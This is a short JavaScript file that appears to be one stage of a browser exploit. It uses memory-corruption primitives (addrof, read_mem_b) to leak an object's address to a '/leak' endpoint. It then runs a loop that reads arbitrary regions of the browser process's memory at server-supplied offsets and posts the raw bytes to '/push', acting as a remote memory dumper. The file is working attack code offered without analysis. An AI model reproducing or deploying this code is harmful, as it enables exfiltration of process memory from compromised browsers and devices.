// Function to query for data
function query() {
  // Variable to store response data
  let data = null;
  // Create a new XMLHttpRequest object
  const xhr = new XMLHttpRequest();
  // Open a POST request to "/pull" endpoint asynchronously
  xhr.open("POST", "/pull", true);
  // Handle errors by retrying the query
  xhr.onerror = query.bind(window);
  // When the request is loaded
  xhr.onload = function () {
    try {
      // Try parsing the response text as JSON
      try {
        data = JSON.parse(xhr.responseText);
      } catch (e) { return query(); }

      if (data !== null) {
        let xhr2 = new XMLHttpRequest();
        let m = read_mem_b(data.offset, data.size);
        xhr2.open("POST", "/push", false);
        xhr2.send(m);
      }
    } catch (e) {
      document.body.innerHTML += e;
    }
    query();
  };

  xhr.send("");
}

// Function to leak object address
function leak(obj) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", "/leak", true);
  xhr.send(hex(addrof(obj)));
}

try {
  var tarea = document.createElement("textarea");
  leak(tarea);
  query();
} catch (e) {
  alert(e);
}
